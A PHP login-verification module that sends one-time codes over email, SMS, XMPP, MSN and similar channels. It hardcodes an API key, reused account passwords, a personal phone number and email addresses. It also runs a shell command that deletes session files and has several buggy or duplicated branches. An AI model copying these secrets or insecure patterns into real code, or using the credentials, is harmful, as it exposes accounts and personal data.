                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                      } 
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193.TK已经成功验证了您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}                              
            elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
             	
            }   
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证成功！'), iconv('gb2312','gb2312','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}            
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3193@g.x3193.cz.cc', iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
                 
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}               
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证成功！,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               $voxeo = new voxeo_class();
                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }
       			elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
    	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}            
         }
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                                      
                   			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = randcode(32,'');
                   			unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
                   			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "", time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
              		 			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);
              		 			
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect(httppath());
                   			}else{
                   				redirect(httppath());                   			
                   			}
                        break;
                }
                else{
                        if (0){
                        }
                        else{
            if (strtolower(trim(request('verify'))) == 'sms'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                        $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code is：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                                   
            }
            elseif (strtolower(trim(request('verify'))) == 'email'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                                  
            }
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193验证您的访问权限失败'),
              'html' => iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}             
            elseif (strtolower(trim(request('verify'))) == 'msn'){
            }   
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}    
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证失败！'), iconv('gb2312','gb2312','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}      			           
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               $voxeo = new imified_class();
                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
        		elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}           
                        }
                         
         					 ($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['PC']);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);                   
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect(httppath());
                   			}else{
                   				redirect(httppath());                   			
                   			}                        
                }
}
//exit;
} // idoll function end
?>

<?php 
//---------------------------------------------
// 被保护页面代码
//---------------------------------------------
//session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//session_start();
//if(substr(PHP_VERSION, 0, 3)=='5.4'){
//		//session_register("X3193");
//}
//elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
//		session_register("X3193");
//}
//if(($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] == $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']!='')){
//}
//else{
//			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url'] = trim($_SERVER["SCRIPT_NAME"])."?".$_SERVER['QUERY_STRING'];
//			echo "<script>window.location = \""."?api=verify&verify=xmpp"."\" ;</script>";
//			exit;
//}
//----------------------------------------

function verify(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');

$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 登录验证");
//$ipverify = 'n'; // y or n 单纯IP验证
//$smsverify = 'y'; // y or n 纯短信认证
//echo $smsverify;
//echo $ipowner.'gg';   
//$IPFilter = new IPFilter('');
//$ipallow = $IPFilter->IPlimiter();
//$redirecturl = $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
$verifymethod = '|fetion|voxeo|';
//$iplimiter = arrmember(checkip($ipallow,$redirecturl),'1');
//echo $iplimiter;

//echo $_SESSION["X3193"]['global'][$iplimiter]['verify']['success'].' '.$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];
//exit;

if(preg_replace("/(.*)(|".strtolower(trim(request('verify')))."|)(.*)/", "$1$2$3", $verifymethod) != $verifymethod){
		session_destroy();	
		if(function_exists('passthru')){
						passthru("find /var/lib/openshift/5419a3585004461665000be4/php/sessions/* -type f -empty -delete",$result);		
		}else{
		}			
		
   	return;
}

if(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) == '' && strtoupper(trim(request('msgverifycode'))) == ''){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = '';
unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
//unset($_SESSION["X3193"]['global'][$iplimiter]['verify']);
//unset($_COOKIE["X3193"]['global'][$iplimiter]['verify']);
setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "",time() + 3600*24*31);
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] = randcode(32,'');
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = randcode(8,'number');

        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        	
        }
        else{
       	
      if (strtolower(trim(request('verify'))) == 'sim'){
                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！','gb2312');
				      		$voxeo = new voxeo_class();
                  $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','The code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);        
      }  
      elseif (strtolower(trim(request('verify'))) == 'email'){

                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'，IP地址为：'.$_SERVER['REMOTE_ADDR'],'gb2312');
     	}       
      elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
     	
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193正在验证您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  }   
      elseif (strtolower(trim(request('verify'))) == 'xmpp'){
         $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
             $conn->connect();
             $conn->processUntil('session_start');
             $conn->presence();
             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
             $conn->disconnect();
      }   
      elseif (strtolower(trim(request('verify'))) == 'msn'){
					$sendMsg = new sendMsg();
					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
					//echo $sendMsg->result.' '.$sendMsg->error;
      } 
      elseif (strtolower(trim(request('verify'))) == 'smtp'){
				$smtp = new smtp('smtp.126.com','25',true,'xcy6272003@126.com','EUIfgwe7a');
        $smtp->sendmail('xcy6272003@126.com','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193正在验证您的访问权限'), iconv('gb2312','gb2312','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      }        
      elseif (strtolower(trim(request('verify'))) == 'gcal'){
              	$google_calendar = new google_class();
              	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193正在验证您的访问权限,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
      }
      elseif (strtolower(trim(request('verify'))) == 'voxeo'){
				      		$voxeo = new voxeo_class();
                  $voxeo->voxeosendsms('+8615998963077','The code of '.trim($_SERVER["SERVER_NAME"]).' is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);        
      }
      elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      }      
      redirect(httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
		}
}
elseif(trim(request('verify')) != '' && trim(request('verifycode')) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) == ''){
 
session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}
 
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
      		echo $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'];
        }
        else{
	//echo trim($_SERVER["SERVER_NAME"]);        	
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">

<table width="95%" height="95%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="">
        <tr>
                <td align="center" valign='middle' style="<?php $style->selcolor($skincolor,'tdbg');?>">
                        <form action="<?php  echo httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=';?>" method="post" name="verify">
                        <input type="input" class="input" border="0" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:200px;font-size:12px;text-align:center;" <?php  $style->input("#f9f9f9","","msgverify");?> name="msgverify"  id="msgverify" value="短信验证码" onmouseover="document.getElementById('msgverify').value=''; >  
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:50px;font-size:12px;text-align:center;<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>

<?php         
        }
}
elseif(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) != '' && strlen(trim(request('msgverify'))) == '8'){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

            if($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] == trim(request('verifycode')) && $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] == trim(request('msgverify')) ){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        }
                        else{
     	 if (strtolower(trim(request('verify'))) == 'sim'){
                              //mail('xcy6272003@126.com','X3193已经成功验证了您的访问权限','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                              
                      }        
            elseif (strtolower(trim(request('verify'))) == 'email'){
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                      }
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){

            				
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193.TK已经成功验证了您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}                               
